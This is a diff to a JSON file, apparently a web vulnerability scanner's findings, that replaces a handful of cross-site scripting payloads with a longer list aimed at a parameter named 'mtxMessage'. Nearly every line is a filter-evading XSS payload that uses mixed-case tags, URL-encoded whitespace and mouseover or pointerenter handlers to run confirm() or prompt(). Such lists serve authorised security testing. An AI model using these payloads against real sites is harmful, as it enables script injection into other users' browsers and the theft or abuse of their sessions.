@@ -55,22 +55,52 @@
   {
     "payloads": [
       {
-        "payload": "<D3v%0aOnpoinTErEnTER%0a=%0aconfirm()%0dx>v3dm0s"
+        "payload": "<A%0dONMousEOVer%0d=%0d(confirm)()%0dx>v3dm0s"
       },
       {
-        "payload": "<A%0aoNMoUseOVEr+=+(confirm)()%0dx>v3dm0s"
+        "payload": "<D3V%0aoNMOUseoVEr+=+(confirm)()>v3dm0s"
       },
       {
-        "payload": "<A%0dONMOusEoveR+=+a=prompt,a()>v3dm0s"
+        "payload": "<dETAIlS%0aOnPOinTereNTEr%09=%09[8].find(confirm)//"
       },
       {
-        "payload": "<hTml%0aoNmOUSEovEr%09=%09(confirm)()%0dx//"
+        "payload": "<d3v/+/oNpOInTeRENTeR%09=%09a=prompt,a()%0dx>v3dm0s"
       },
       {
-        "payload": "<D3v/+/OnPOiNTErenTeR%09=%09confirm()>v3dm0s"
+        "payload": "<A%0donpoINTErENTER%0d=%0d[8].find(confirm)>v3dm0s"
       },
       {
-        "payload": "<A%0dONpointeREnter%0a=%0aconfirm()>v3dm0s"
+        "payload": "<D3v/+/oNPoInTEReNTER%0a=%0a(confirm)()%0dx>v3dm0s"
+      },
+      {
+        "payload": "<DEtAILs/+/OnPoiNtERENter%0d=%0da=prompt,a()>"
+      },
+      {
+        "payload": "<a%0aONmoUSEoveR%0a=%0aa=prompt,a()>v3dm0s"
+      },
+      {
+        "payload": "<HTMl%09ONMOUseoVEr%09=%09(confirm)()//"
+      },
+      {
+        "payload": "<D3v%09OnmoUSeOver%09=%09(confirm)()%0dx>v3dm0s"
+      },
+      {
+        "payload": "<dETaIls%0aoNPOIntErEnter%0a=%0a(prompt)``>"
+      },
+      {
+        "payload": "<Html%0aOnpOInTerENter+=+(confirm)()>"
+      },
+      {
+        "payload": "<html/+/oNMoUsEoVER+=+(confirm)()>"
+      },
+      {
+        "payload": "<htmL%0aoNMOuSEovEr+=+a=prompt,a()%0dx//"
+      },
+      {
+        "payload": "<HTMl%0dONMousEOVEr+=+confirm()%0dx>"
+      },
+      {
+        "payload": "<HTML%0aONmouSeOVer%0a=%0aa=prompt,a()%0dx//"
       }
     ],
     "parameter": "mtxMessage"
